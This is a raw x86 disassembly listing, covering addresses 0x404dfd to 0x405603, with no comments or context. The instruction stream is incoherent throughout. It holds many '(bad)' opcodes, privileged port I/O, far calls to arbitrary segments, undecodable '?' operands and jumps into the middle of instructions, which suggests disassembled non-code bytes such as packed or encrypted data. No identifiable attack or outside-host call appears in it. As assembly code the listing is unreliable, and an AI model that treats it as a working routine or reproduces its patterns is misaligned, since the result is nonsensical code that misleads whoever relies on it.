  404dfd:	push   ss
  404dfe:	(bad)  
  404dff:	pop    ecx
  404e00:	js     0x404e0b
  404e02:	and    BYTE PTR [edi+ebp*8-0x211b2dbc],bl
  404e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e0a:	das    
  404e0b:	push   eax
  404e0c:	sbb    eax,0xff0deed4
  404e11:	dec    edi
  404e12:	gs mov esp,0xa11f57e2
  404e18:	cwde   
  404e19:	jo     0x404e1d
  404e1b:	pop    ecx
  404e1c:	push   esi
  404e1d:	sti    
  404e1e:	ror    DWORD PTR [esi+ebx*2],1
  404e21:	push   esi
  404e22:	repnz xchg ebp,eax
  404e24:	inc    ebx
  404e25:	loop   0x404dec
  404e27:	xchg   ah,cl
  404e29:	pop    esi
  404e2a:	jb     0x404e35
  404e2c:	sbb    al,0x36
  404e2e:	mov    eax,0x7c541e0e
  404e33:	imul   bh
  404e35:	mov    esi,0x905523ee
  404e3a:	cmp    DWORD PTR [edi-0x5d],eax
  404e3d:	leave  
  404e3e:	(bad)  
  404e3f:	mov    al,ds:0x29fdf30d
  404e44:	inc    eax
  404e45:	aam    0x98
  404e47:	maxps  xmm1,xmm3
  404e4a:	pop    edi
  404e4b:	lods   eax,DWORD PTR ds:[esi]
  404e4c:	je     0x404e61
  404e4e:	xchg   ebp,eax
  404e4f:	and    ecx,eax
  404e51:	xchg   esp,eax
  404e52:	cmp    ch,BYTE PTR [esi-0x218f13e]
  404e58:	pop    esp
  404e59:	jne    0x404dfd
  404e5b:	add    DWORD PTR [esi],edi
  404e5d:	mov    dh,BYTE PTR [esp]
  404e60:	pop    esi
  404e61:	test   BYTE PTR ds:0x574a11e8,dl
  404e67:	push   0x3fac68da
  404e6c:	pop    ebp
  404e6d:	cmp    bl,bl
  404e6f:	mov    ah,0x4c
  404e71:	mov    ds:0xcd4678ab,eax
  404e76:	out    0x22,eax
  404e78:	(bad)  
  404e79:	adc    al,0x24
  404e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e7c:	mov    ds,WORD PTR [edx+0x42bada34]
  404e82:	lea    eax,[ebx+0x29cf4d49]
  404e88:	inc    edx
  404e89:	sar    DWORD PTR [ebx],1
  404e8b:	mov    eax,ds:0x37765771
  404e90:	mov    bh,0xd3
  404e92:	out    dx,al
  404e93:	call   0x9b9d:0x21bedbc5
  404e9a:	bound  esp,QWORD PTR [ecx+0x3913095b]
  404ea0:	or     DWORD PTR [edi+0x655eb570],ecx
  404ea6:	daa    
  404ea7:	dec    esi
  404ea8:	call   0x8030bdbf
  404ead:	pop    ebp
  404eae:	mov    ds:0xec6db63b,eax
  404eb3:	ins    DWORD PTR es:[edi],dx
  404eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eb5:	out    dx,eax
  404eb6:	out    0xdd,al
  404eb8:	lock mov ebx,0x31af1b02
  404ebe:	cs sub ecx,ecx
  404ec1:	mov    cl,cl
  404ec3:	std    
  404ec4:	xor    esp,DWORD PTR [ecx-0x32]
  404ec7:	out    0xb2,eax
  404ec9:	dec    esp
  404eca:	cmp    ch,BYTE PTR [edi+0xa]
  404ecd:	sub    ebp,esi
  404ecf:	(bad)  
  404ed1:	test   eax,ecx
  404ed3:	rol    DWORD PTR [edx-0x2f],0x3
  404ed7:	mov    eax,ds:0x7218fefe
  404edc:	mov    ecx,esp
  404ede:	scas   al,BYTE PTR es:[edi]
  404edf:	mov    ds:0xb2d0765b,al
  404ee4:	mov    al,0x9c
  404ee6:	outs   dx,BYTE PTR ds:[esi]
  404ee7:	jecxz  0x404f0a
  404ee9:	(bad)  
  404eea:	mov    ch,0xa1
  404eec:	inc    edx
  404eed:	push   DWORD PTR [edi]
  404eef:	mov    DWORD PTR [ecx+0x4e],edx
  404ef2:	sahf   
  404ef3:	pusha  
  404ef4:	scas   al,BYTE PTR es:[edi]
  404ef5:	addr16 ja 0x404ee2
  404ef8:	pop    ebx
  404ef9:	(bad)  
  404efa:	xchg   ebp,eax
  404efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404efc:	cld    
  404efd:	xlat   BYTE PTR ds:[ebx]
  404efe:	fwait
  404eff:	mov    ecx,0x9aa698bc
  404f04:	add    edx,DWORD PTR [edx-0x39]
  404f07:	push   cs
  404f08:	xchg   ebp,eax
  404f09:	fsubr  DWORD PTR [esi]
  404f0b:	sub    eax,DWORD PTR [edx+0x72b10b3f]
  404f11:	or     eax,0xd1b52520
  404f16:	push   eax
  404f17:	dec    ebx
  404f18:	xchg   ecx,eax
  404f19:	mov    al,ds:0x8a1d3143
  404f1e:	shl    DWORD PTR [edi-0x513138c3],cl
  404f24:	shl    BYTE PTR [eax-0x3a],0xc7
  404f28:	ja     0x404ec9
  404f2a:	out    dx,al
  404f2b:	mov    eax,ds:0xdac92c42
  404f30:	mov    cl,0xf1
  404f32:	mov    eax,fs:0xd0d0d7ca
  404f38:	push   esi
  404f39:	ja     0x404fb2
  404f3b:	add    BYTE PTR [esi-0x60],bl
  404f3e:	sbb    BYTE PTR [eax-0xbbe1b33],ah
  404f44:	push   ds
  404f45:	popa   
  404f46:	xchg   edi,eax
  404f47:	inc    ebp
  404f48:	mov    BYTE PTR [edi],al
  404f4a:	test   DWORD PTR [edi+0x1ee0f4b],eax
  404f50:	inc    ebx
  404f51:	xchg   esp,eax
  404f52:	mov    esi,0xe69c1f69
  404f57:	stos   DWORD PTR es:[edi],eax
  404f58:	mov    ecx,0x19d4ee06
  404f5d:	rcl    DWORD PTR [edi-0x793fc805],cl
  404f63:	mov    eax,ds:0x19cbed31
  404f68:	retf   
  404f69:	jmp    0x4bd3:0x18be2148
  404f70:	xchg   ebx,eax
  404f71:	test   al,0x9b
  404f73:	lds    ebx,FWORD PTR [ebp-0x1966415c]
  404f79:	cmp    ebp,esi
  404f7b:	add    bh,ch
  404f7d:	xchg   ecx,eax
  404f7e:	gs pop ds
  404f80:	lock push 0x80955eee
  404f86:	test   al,0x22
  404f88:	cmp    eax,0xa2af785b
  404f8d:	stos   DWORD PTR es:[edi],eax
  404f8e:	outs   dx,BYTE PTR ds:[esi]
  404f8f:	repz loop 0x404fe5
  404f92:	lea    edx,[ecx]
  404f94:	jmp    DWORD PTR [ebp-0x12]
  404f97:	(bad)  
  404f98:	leave  
  404f99:	(bad)  
  404f9a:	shl    BYTE PTR ds:0xa1835963,cl
  404fa0:	shl    DWORD PTR [eax],1
  404fa2:	pop    esp
  404fa3:	cli    
  404fa4:	dec    esp
  404fa5:	sub    dh,BYTE PTR [ebp-0x68]
  404fa8:	pop    esi
  404fa9:	cmp    eax,0x21c6db72
  404fae:	dec    ecx
  404faf:	push   ss
  404fb0:	adc    eax,0xdcc3db61
  404fb5:	enter  0xb042,0xab
  404fb9:	ja     0x404fa8
  404fbb:	and    esi,ecx
  404fbd:	lods   eax,DWORD PTR ds:[esi]
  404fbe:	popf   
  404fbf:	adc    eax,0xe6364784
  404fc4:	call   0x9c07:0xcb6d5760
  404fcb:	or     dl,dh
  404fcd:	sahf   
  404fce:	fmul   st,st(7)
  404fd0:	cmp    BYTE PTR [edi+0x54],dl
  404fd3:	and    al,0xf9
  404fd5:	lock icebp 
  404fd7:	fidivr WORD PTR [ebx-0x50]
  404fda:	in     eax,dx
  404fdb:	mov    bh,0x19
  404fdd:	popa   
  404fde:	mov    ch,0xb3
  404fe0:	fmul   QWORD PTR [eax]
  404fe2:	pop    edx
  404fe3:	bound  edi,QWORD PTR [eax]
  404fe5:	mov    bl,0xee
  404fe7:	outs   dx,BYTE PTR ds:[esi]
  404fe8:	or     DWORD PTR [ebx-0xeed2d72],ecx
  404fee:	cmp    ebp,DWORD PTR [esi-0x63806fc5]
  404ff4:	rcr    bl,1
  404ff6:	mov    BYTE PTR [edx-0x5a],ch
  404ff9:	pusha  
  404ffa:	nop
  404ffb:	stos   BYTE PTR es:[edi],al
  404ffc:	and    dh,BYTE PTR [esi]
  404ffe:	and    dl,dl
  405000:	pop    esi
  405001:	int3   
  405002:	fcmove st,st(0)
  405004:	cmp    eax,0x9138447e
  405009:	pusha  
  40500a:	dec    esp
  40500b:	jg     0x404ff9
  40500d:	mov    esp,0x8e9974b9
  405012:	out    dx,al
  405013:	popf   
  405014:	in     al,0x59
  405016:	sbb    al,BYTE PTR [eax+edx*2+0x6c]
  40501a:	sahf   
  40501b:	mov    ?,WORD PTR [eax]
  40501d:	nop
  40501e:	ins    BYTE PTR es:[edi],dx
  40501f:	loope  0x404fc0
  405021:	int    0x57
  405023:	jg     0x405035
  405025:	mov    al,0xee
  405027:	pop    es
  405028:	pop    edx
  405029:	leave  
  40502a:	rcr    DWORD PTR [esi+0x4b],0x51
  40502e:	dec    esp
  40502f:	mov    eax,ds:0x202a9ebb
  405034:	mov    cl,0xb9
  405036:	mov    ecx,0xd1df5e8d
  40503b:	(bad)  
  40503c:	pusha  
  40503d:	idiv   BYTE PTR ds:0x76613973
  405043:	(bad)  
  405045:	and    eax,0x2c2e1cc6
  40504a:	out    dx,al
  40504b:	mov    ds:0x862358b4,eax
  405050:	lahf   
  405051:	test   DWORD PTR [eax],edx
  405053:	mov    ds:0x620b20c9,al
  405058:	div    BYTE PTR [esi]
  40505a:	js     0x4050a7
  40505c:	fisub  WORD PTR [ebp+0x33ec02ef]
  405062:	out    dx,eax
  405063:	and    ah,BYTE PTR [ebx+0x5eb3cb6d]
  405069:	(bad)  
  40506a:	sbb    DWORD PTR [ebx],ebp
  40506c:	adc    DWORD PTR [ecx-0x34c15ef4],ebx
  405072:	push   ds
  405073:	lock fsub st,st(3)
  405076:	daa    
  405077:	cmp    edx,DWORD PTR [esi+0x57]
  40507a:	sub    DWORD PTR [ecx],edx
  40507c:	in     al,0xac
  40507e:	(bad)  
  40507f:	sahf   
  405080:	arpl   bp,bp
  405082:	int3   
  405083:	mov    DWORD PTR [ebx],edi
  405085:	or     DWORD PTR [ecx+eax*2],ecx
  405088:	push   ebx
  405089:	clc    
  40508a:	xchg   edx,eax
  40508b:	inc    ebx
  40508c:	pop    esi
  40508d:	jns    0x40501d
  40508f:	cld    
  405090:	mov    eax,0x9c2fc524
  405095:	pop    ecx
  405096:	sti    
  405097:	push   es
  405098:	ds inc ebp
  40509a:	ins    DWORD PTR es:[edi],dx
  40509b:	jno    0x4050e7
  40509d:	ds dec ebp
  40509f:	mov    ebp,0x51739f54
  4050a4:	sahf   
  4050a5:	lahf   
  4050a6:	sub    dh,ah
  4050a8:	sub    DWORD PTR [ebx-0x42],0xb0c311a0
  4050af:	(bad)  
  4050b0:	jp     0x4050ff
  4050b2:	cmp    al,0x21
  4050b4:	push   edx
  4050b5:	dec    ecx
  4050b6:	aas    
  4050b7:	mov    BYTE PTR [edx-0x61ad8e20],dh
  4050bd:	cmp    BYTE PTR [ecx-0x639edd2e],bh
  4050c3:	ja     0x405110
  4050c5:	mov    BYTE PTR [ebx+0x2d6f6170],bh
  4050cb:	push   ebp
  4050cc:	out    0xf1,al
  4050ce:	pop    ds
  4050cf:	xchg   edi,eax
  4050d0:	jb     0x40508c
  4050d2:	addr16 mov eax,ds:0x6a5c
  4050d6:	jg     0x40510a
  4050d8:	xchg   esi,eax
  4050d9:	jmp    0xa29ebb21
  4050de:	mov    edx,0x5732c214
  4050e3:	sahf   
  4050e4:	fstp   QWORD PTR [ecx+0x3a]
  4050e7:	push   edx
  4050e8:	mov    ch,0x7b
  4050ea:	sub    ah,BYTE PTR [ecx+0x5e07344c]
  4050f0:	pop    esi
  4050f1:	sti    
  4050f2:	sub    dh,dl
  4050f4:	or     ah,BYTE PTR [ebp-0x5e]
  4050f7:	xlat   BYTE PTR ds:[ebx]
  4050f8:	nop
  4050f9:	mov    dh,0x1a
  4050fb:	mov    eax,ds:0xa5d202f8
  405100:	mov    ebx,0x5293d827
  405105:	or     edi,eax
  405107:	loop   0x40515b
  405109:	(bad)  
  40510a:	cs in  eax,dx
  40510c:	cli    
  40510d:	xchg   DWORD PTR [esi+0x68707490],ebx
  405113:	out    0x96,eax
  405115:	adc    al,0xc4
  405117:	rol    DWORD PTR [ecx+eiz*1+0x33],cl
  40511b:	inc    esi
  40511c:	pop    esi
  40511d:	stos   DWORD PTR es:[edi],eax
  40511e:	xchg   BYTE PTR ds:0xa13987a0,ah
  405124:	mov    WORD PTR [edx],ds
  405126:	imul   ebx,DWORD PTR [bx+di],0x5eaa1106
  40512d:	mov    ebx,0x3f0f2dfb
  405132:	pop    edx
  405133:	sbb    ebx,DWORD PTR [esi]
  405135:	and    dl,dl
  405137:	mov    al,ds:0x5bb6ab58
  40513c:	inc    esi
  40513d:	cwde   
  40513e:	mov    dl,0x7c
  405140:	pop    edi
  405141:	push   esp
  405142:	jmp    0x4c7cbc07
  405147:	push   ecx
  405148:	jnp    0x405180
  40514a:	inc    ebx
  40514b:	mov    eax,ds:0xbce42a16
  405150:	rol    al,1
  405152:	neg    DWORD PTR ds:0x9a5cb55e
  405158:	sub    DWORD PTR [edx+ecx*1+0x1d],ecx
  40515c:	adc    DWORD PTR [ecx-0x39],esp
  40515f:	cmp    eax,0x44b9a519
  405164:	cld    
  405165:	mov    dl,0xee
  405167:	daa    
  405168:	push   edx
  405169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40516a:	and    DWORD PTR [edx-0x702fc25b],esi
  405170:	sti    
  405171:	push   esi
  405172:	ret    0xc1a0
  405175:	je     0x405154
  405177:	adc    al,0x6b
  405179:	push   edx
  40517a:	lock push 0xffffffb1
  40517d:	mov    bl,0xb6
  40517f:	and    BYTE PTR [edx],cl
  405181:	dec    ecx
  405182:	cmp    BYTE PTR ds:0x684859f0,bh
  405188:	cmp    esi,0xffffffad
  40518b:	pusha  
  40518c:	scas   al,BYTE PTR es:[edi]
  40518d:	retf   0x72ca
  405190:	lock shr dh,0xf4
  405194:	pop    eax
  405195:	fbld   TBYTE PTR [ebx+0x7bd11a24]
  40519b:	mov    eax,ds:0xd9d2b3bc
  4051a0:	ds ins DWORD PTR es:[edi],dx
  4051a2:	cmp    BYTE PTR [ebx+0x60],bl
  4051a5:	test   cl,dl
  4051a7:	push   0xffffffd9
  4051a9:	lods   al,BYTE PTR ds:[esi]
  4051aa:	pushf  
  4051ab:	and    DWORD PTR ds:0x42a0f9c6,0x74b0c8e7
  4051b5:	adc    al,0x78
  4051b7:	xlat   BYTE PTR ds:[ebx]
  4051b8:	pop    ebx
  4051b9:	dec    edx
  4051ba:	cmp    esi,edi
  4051bc:	adc    edx,ebp
  4051be:	ficom  WORD PTR [esi+eiz*8]
  4051c1:	mov    DWORD PTR [ebx+0x5130a1a1],ebp
  4051c7:	xchg   esp,eax
  4051c8:	jb     0x40517e
  4051ca:	popaw  
  4051cc:	xor    eax,0xb43f5a0
  4051d1:	scas   eax,DWORD PTR es:[edi]
  4051d2:	mov    ds:0x77961b21,al
  4051d7:	push   0xe130615d
  4051dc:	ja     0x40516a
  4051de:	sub    al,0xdf
  4051e0:	mov    eax,0xaf7aee32
  4051e5:	jno    0x4051eb
  4051e7:	sbb    bl,BYTE PTR [ebp-0x15ec2ef]
  4051ed:	or     edx,esi
  4051ef:	jg     0x405204
  4051f1:	fs ins BYTE PTR es:[edi],dx
  4051f3:	add    ebx,DWORD PTR [esi-0x6a]
  4051f6:	fisub  WORD PTR [ecx-0x13ed54e6]
  4051fc:	out    0x5f,eax
  4051fe:	retf   
  4051ff:	sub    edx,DWORD PTR [ebp+0x32cb2b8d]
  405205:	xor    DWORD PTR [edx-0x3611a1b1],edi
  40520b:	fsubr  DWORD PTR [edx-0x2c]
  40520e:	push   0x47
  405210:	neg    DWORD PTR [ebx+0x4a]
  405213:	or     eax,0x218acd5f
  405218:	call   0xa0a7:0x5e5b5f06
  40521f:	stos   DWORD PTR es:[edi],eax
  405220:	dec    ecx
  405221:	add    DWORD PTR ds:0x6f7aecc0,ecx
  405227:	push   DWORD PTR [ebp+0x59]
  40522a:	jp     0x405247
  40522c:	sbb    eax,0xbc0eba01
  405231:	gs out dx,al
  405233:	js     0x405254
  405235:	sub    al,0x35
  405237:	sbb    BYTE PTR [ecx+0x3da7b3da],cl
  40523d:	or     cl,bh
  40523f:	sub    eax,0xfe27b07d
  405244:	outs   dx,DWORD PTR ds:[esi]
  405245:	cmp    esi,edi
  405247:	sti    
  405248:	jo     0x405257
  40524a:	out    dx,al
  40524b:	sbb    esp,eax
  40524d:	add    eax,DWORD PTR [ecx-0x65]
  405250:	cmp    BYTE PTR [ecx-0x39],ah
  405253:	mov    WORD PTR [eax],gs
  405255:	std    
  405256:	(bad)  
  405257:	or     eax,0x2bee6ad5
  40525c:	or     DWORD PTR [esi-0x3c],ebx
  40525f:	cmc    
  405260:	sbb    DWORD PTR [ebx+edx*2+0x79],0x68c560df
  405268:	repnz add BYTE PTR [edx-0x113bbbdd],0xbc
  405270:	push   ds
  405271:	test   DWORD PTR [edi-0x35],esi
  405274:	jnp    0x405245
  405276:	mov    WORD PTR [ecx-0x2458e522],fs
  40527c:	cdq    
  40527d:	dec    edx
  40527e:	push   0x2c
  405280:	pop    ebp
  405281:	adc    edi,DWORD PTR [ebx+0x4f43dbd6]
  405287:	outs   dx,DWORD PTR ds:[esi]
  405288:	fdivp  st(6),st
  40528a:	adc    eax,0x773eb23e
  40528f:	xor    DWORD PTR ds:0x232106b3,0x8840b1cf
  405299:	pop    ecx
  40529a:	inc    esi
  40529b:	ja     0x40528e
  40529d:	push   ecx
  40529e:	xlat   BYTE PTR ss:[ebx]
  4052a0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052a2:	out    dx,al
  4052a3:	ror    DWORD PTR [esi+0x642f2dd5],cl
  4052a9:	leave  
  4052aa:	ja     0x4052f6
  4052ac:	inc    ecx
  4052ad:	dec    esi
  4052ae:	out    dx,al
  4052af:	les    esi,FWORD PTR ss:[edi+0x612a8867]
  4052b6:	out    0x54,eax
  4052b8:	mov    bh,0x5a
  4052ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052bb:	ja     0x4052f9
  4052bd:	daa    
  4052be:	in     eax,dx
  4052bf:	mov    eax,ds:0x64bbe094
  4052c4:	xlat   BYTE PTR ds:[ebx]
  4052c5:	jae    0x40530f
  4052c7:	loope  0x40527d
  4052c9:	in     eax,dx
  4052ca:	test   eax,0xcd76fe02
  4052cf:	(bad)  
  4052d0:	jge    0x4052a8
  4052d2:	js     0x405341
  4052d4:	cli    
  4052d5:	push   ebp
  4052d6:	out    dx,al
  4052d7:	pusha  
  4052d8:	xchg   ebx,eax
  4052d9:	add    DWORD PTR [esi+edx*8-0x5baf7804],ecx
  4052e0:	xor    al,0x9c
  4052e2:	jmp    esi
  4052e4:	fcomp  QWORD PTR [eax+0x40a7846e]
  4052ea:	add    esp,ebx
  4052ec:	add    eax,0xd396ae39
  4052f1:	and    dl,BYTE PTR [esp+edx*1+0x4f0e601e]
  4052f8:	mov    ch,0xeb
  4052fa:	pop    ds
  4052fb:	jb     0x4052ab
  4052fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052fe:	fldenv [eax]
  405300:	sub    eax,0x4cf30713
  405305:	das    
  405306:	outs   dx,DWORD PTR ds:[esi]
  405307:	mov    eax,ds:0xecbdc002
  40530c:	or     bl,BYTE PTR [ebx+0x19]
  40530f:	sub    DWORD PTR [esi-0x39a51089],0xffffffa9
  405316:	inc    ebx
  405317:	bound  edi,QWORD PTR [ecx]
  405319:	push   ecx
  40531a:	dec    ebx
  40531b:	cwde   
  40531c:	call   0x9b05:0x2da14a3f
  405323:	sub    esi,DWORD PTR [ebp+0x5e5fa832]
  405329:	mov    eax,0x48322214
  40532e:	xor    ecx,DWORD PTR [esi]
  405330:	retf   
  405331:	pusha  
  405332:	mov    ds:0x9b47102f,al
  405337:	dec    ebp
  405338:	sub    bh,BYTE PTR [ebp-0x12]
  40533b:	fisttp WORD PTR [edx+0xacbda03]
  405341:	fimul  DWORD PTR [eax]
  405343:	mov    eax,ds:0x8ef85bba
  405348:	or     eax,0x5e136e27
  40534d:	jbe    0x4052f0
  40534f:	fnsave [eax]
  405351:	inc    edx
  405352:	hlt    
  405353:	shl    BYTE PTR [esi+eiz*2],cl
  405356:	pop    esp
  405357:	dec    esi
  405358:	fiadd  WORD PTR [eax-0x5684b283]
  40535e:	xlat   BYTE PTR ds:[ebx]
  40535f:	or     BYTE PTR [esi-0x3a],dh
  405362:	push   eax
  405363:	mov    eax,0xcd8af85d
  405368:	dec    eax
  405369:	add    BYTE PTR [eax+0x60],0x8e
  40536d:	dec    esp
  40536e:	pop    ebx
  40536f:	lahf   
  405370:	dec    ecx
  405371:	mov    ch,ah
  405373:	cs int3 
  405375:	pusha  
  405376:	and    eax,0x2851fd73
  40537b:	test   eax,0x27b6287c
  405380:	mov    ch,0x5f
  405382:	cld    
  405383:	into   
  405384:	sbb    al,0x30
  405387:	xor    BYTE PTR [ecx+0x5e],bh
  40538a:	shl    WORD PTR [esi],0x29
  40538e:	call   0xb2118b33
  405393:	mov    DWORD PTR [esi+edi*8+0x34],ecx
  405397:	pusha  
  405398:	pop    esi
  405399:	or     al,0x27
  40539b:	mov    edx,0xd2aec64
  4053a0:	mov    ?,WORD PTR [edx+0x1d]
  4053a3:	mov    al,0x36
  4053a5:	popa   
  4053a6:	loop   0x405365
  4053a8:	xor    DWORD PTR [esi+0x365eea2d],0xffffff9a
  4053af:	arpl   ax,cx
  4053b1:	xchg   ecx,eax
  4053b2:	push   esi
  4053b3:	dec    ebx
  4053b4:	shl    BYTE PTR [eax+0x29],cl
  4053b7:	sub    bh,bl
  4053b9:	pop    edi
  4053ba:	push   0x69
  4053bc:	nop
  4053bd:	gs out dx,eax
  4053bf:	fistp  QWORD PTR [edi+0x3d]
  4053c2:	inc    esi
  4053c4:	addr16 jmp 0xaecffb84
  4053ca:	inc    eax
  4053cb:	ret    
  4053cc:	cmp    eax,0xf32fc6d1
  4053d1:	call   0xddec:0x2dd5d9ee
  4053d8:	je     0x405433
  4053da:	sbb    al,0xc7
  4053dc:	sbb    eax,0xdc8d3e1d
  4053e1:	cdq    
  4053e2:	and    dh,bl
  4053e4:	(bad)
  4053e7:	pop    ecx
  4053e8:	pop    ds
  4053e9:	dec    ebp
  4053ea:	out    dx,al
  4053eb:	jno    0x405410
  4053ed:	sub    BYTE PTR [ecx+0x45f0abb6],cl
  4053f3:	jns    0x405438
  4053f5:	ror    DWORD PTR [ebx],1
  4053f7:	mov    eax,ds:0x78a20646
  4053fc:	pop    ds
  4053fd:	cli    
  4053fe:	mov    ?,WORD PTR [ecx]
  405400:	pop    ebp
  405401:	jmp    0x4053ef
  405403:	dec    edi
  405404:	int3   
  405405:	imul   esi,DWORD PTR [eax+eiz*1],0x2e
  405409:	(bad)  
  40540b:	mov    al,ds:0xb27d1b54
  405410:	std    
  405411:	inc    esi
  405412:	pop    edx
  405413:	mov    bl,0x5e
  405415:	mov    ah,0xd0
  405417:	add    al,0xfb
  405419:	add    DWORD PTR [ecx-0x42],0x1eb86160
  405420:	adc    eax,0x1ae1462
  405425:	mul    ebp
  405427:	ficomp DWORD PTR [esi+0x57]
  40542a:	fdiv   QWORD PTR [ecx]
  40542c:	jae    0x4054a2
  40542e:	inc    edx
  40542f:	pop    ss
  405430:	jmp    0xeb8e0d95
  405435:	push   edi
  405436:	add    eax,DWORD PTR [edi+eax*8]
  405439:	pushf  
  40543a:	imul   eax,DWORD PTR fs:[esi-0x585a1138],0xffffffbb
  405442:	outs   dx,BYTE PTR ds:[esi]
  405443:	adc    al,BYTE PTR [ebp-0x525e7885]
  405449:	xchg   ecx,eax
  40544a:	xchg   esp,eax
  40544b:	and    eax,0x3caabf0d
  405450:	pop    esi
  405451:	fsubr  QWORD PTR [ebx+0x77ea041a]
  405457:	(bad)  
  405458:	mov    eax,ds:0x34e2a360
  40545d:	int    0xb9
  40545f:	(bad)  
  405460:	mov    esi,0x5e1154c0
  405465:	jne    0x40546c
  405467:	jp     0x4054da
  405469:	loopne 0x4054ba
  40546b:	pop    ecx
  40546c:	daa    
  40546d:	popa   
  40546e:	inc    eax
  40546f:	mov    al,0x72
  405471:	dec    edi
  405472:	ja     0x4054c0
  405474:	out    0x58,al
  405476:	in     al,dx
  405477:	jecxz  0x4054c4
  405479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40547a:	jns    0x40540c
  40547c:	mov    ebx,0x329ef7c0
  405481:	popa   
  405482:	dec    ebx
  405483:	iret   
  405484:	or     eax,DWORD PTR [esi+0x16]
  405487:	xchg   ebx,eax
  405488:	addr16 mov al,ds:0x19ee
  40548c:	inc    edi
  40548d:	add    dh,BYTE PTR ds:0xa3aed886
  405493:	mov    eax,ds:0x3d808906
  405498:	clc    
  405499:	or     al,0xd7
  40549b:	out    dx,eax
  40549c:	pop    esi
  40549d:	adc    eax,0x1b3de1dd
  4054a2:	iret   
  4054a3:	xlat   BYTE PTR ds:[ebx]
  4054a4:	out    0x5e,eax
  4054a6:	push   es
  4054a7:	test   DWORD PTR [esi+eiz*8-0x6f],ebx
  4054ab:	jmp    0xecee:0x1240d969
  4054b2:	jne    0x405469
  4054b4:	(bad)  
  4054b5:	pusha  
  4054b6:	in     al,dx
  4054b7:	fwait
  4054b8:	cmp    ch,0x2c
  4054bb:	in     al,dx
  4054bc:	add    bh,dl
  4054be:	out    dx,al
  4054bf:	sub    ch,cl
  4054c1:	xchg   DWORD PTR ds:0x2a82695,ebp
  4054c7:	repz sbb bl,BYTE PTR [ecx]
  4054ca:	adc    bh,0x5e
  4054cd:	aad    0x2e
  4054cf:	mov    esp,0xf456ee6
  4054d4:	pop    esi
  4054d5:	test   eax,0xd119a023
  4054da:	fstp   DWORD PTR ds:0xccff6100
  4054e0:	out    dx,eax
  4054e1:	xchg   esp,eax
  4054e2:	jne    0x405473
  4054e4:	add    DWORD PTR [edi+0x3ab3e4ee],eax
  4054ea:	sub    cl,dh
  4054ec:	aas    
  4054ed:	test   eax,0xc6c2b188
  4054f2:	enter  0x249a,0x7
  4054f6:	in     eax,dx
  4054f7:	mov    edi,0x7a793edc
  4054fc:	or     edx,eax
  4054fe:	inc    edx
  4054ff:	xchg   ebx,eax
  405500:	push   ecx
  405501:	popa   
  405502:	sbb    eax,0x76f65c36
  405507:	leave  
  405508:	loope  0x40557c
  40550a:	xlat   BYTE PTR ds:[ebx]
  40550b:	sbb    DWORD PTR [esi-0x5a],0xffffff92
  40550f:	cmp    edi,eax
  405511:	sti    
  405512:	nop
  405513:	xchg   ebp,eax
  405514:	shl    BYTE PTR [esi],0x72
  405517:	scas   eax,DWORD PTR es:[edi]
  405518:	push   ecx
  405519:	sub    eax,0xb6e1baee
  40551e:	aam    0xb9
  405520:	ret    0xee20
  405523:	dec    edi
  405524:	mov    al,gs:0x3097c640
  40552a:	mov    ecx,0x5f1666a0
  40552f:	nop
  405530:	adc    DWORD PTR ds:0xb280cb4c,ebx
  405536:	out    dx,al
  405537:	test   BYTE PTR [edx+edi*8],dl
  40553a:	adc    al,0x4f
  40553c:	mov    al,0xed
  40553e:	jge    0x4054e1
  405540:	aad    0x6c
  405542:	mov    eax,ds:0xd3083519
  405547:	lock pop esi
  405549:	fnsave [edi]
  40554b:	ror    esi,1
  40554d:	xchg   ecx,eax
  40554e:	xor    DWORD PTR [edi-0x77c49eaf],edi
  405554:	leave  
  405555:	xor    al,0x65
  405557:	xchg   edx,eax
  405558:	inc    edx
  405559:	data16 out dx,al
  40555b:	mov    eax,ds:0xb75904c7
  405560:	fstp   QWORD PTR [eax-0x21055f43]
  405566:	jmp    0x3df324af
  40556b:	fnstenv [esp+ebx*4]
  40556e:	mov    DWORD PTR [ecx+0x21baa862],esp
  405574:	int3   
  405575:	adc    bl,BYTE PTR [ecx+0x2d6b0da1]
  40557b:	jns    0x40554f
  40557d:	adc    eax,0x3e5ffced
  405582:	fist   DWORD PTR [edx+0x3171babe]
  405588:	sti    
  405589:	cmp    ch,BYTE PTR [ecx-0x5f]
  40558c:	fmul   QWORD PTR [ebx+0x3d]
  40558f:	inc    edi
  405590:	jbe    0x40551c
  405592:	inc    ebp
  405593:	pop    ds
  405594:	pop    esi
  405595:	mov    dh,0xe8
  405597:	adc    cl,BYTE PTR [esi+0x1a]
  40559a:	adc    al,0x7
  40559c:	out    0x60,al
  40559e:	in     al,dx
  40559f:	outs   dx,BYTE PTR ds:[esi]
  4055a0:	ss sub dl,cl
  4055a3:	sbb    eax,0xb9eed2bf
  4055a8:	sbb    DWORD PTR [edx],0x2c7522bd
  4055ae:	aaa    
  4055af:	mov    eax,ds:0x54774756
  4055b4:	cdq    
  4055b5:	inc    edi
  4055b6:	js     0x405574
  4055b8:	(bad)  
  4055b9:	imul   esi,eax,0x214e4aaa
  4055bf:	ja     0x40561f
  4055c1:	dec    ebp
  4055c2:	call   0x9e1822f4
  4055c7:	lods   eax,DWORD PTR ds:[esi]
  4055c8:	pop    ecx
  4055c9:	push   ecx
  4055ca:	outs   dx,BYTE PTR ds:[esi]
  4055cb:	or     al,0x32
  4055cd:	cmp    BYTE PTR [edi-0x60],ch
  4055d0:	or     DWORD PTR [ecx+ebx*8],0x2cfc64d0
  4055d7:	adc    eax,0xdea7a147
  4055dc:	fimul  DWORD PTR [ebx]
  4055de:	pop    ds
  4055df:	fwait
  4055e0:	lock repz jge 0x4055de
  4055e4:	enter  0xac60,0xfc
  4055e8:	xchg   esi,eax
  4055e9:	enter  0xa82f,0x5e
  4055ed:	jg     0xd82e2a3b
  4055f3:	add    DWORD PTR ds:0x214a0b61,eax
  4055f9:	xchg   edi,eax
  4055fa:	pop    edi
  4055fb:	adc    DWORD PTR [ecx-0x1dbc0f4b],esi
  405601:	test   al,0xb2
  405603:	loope  0x405635
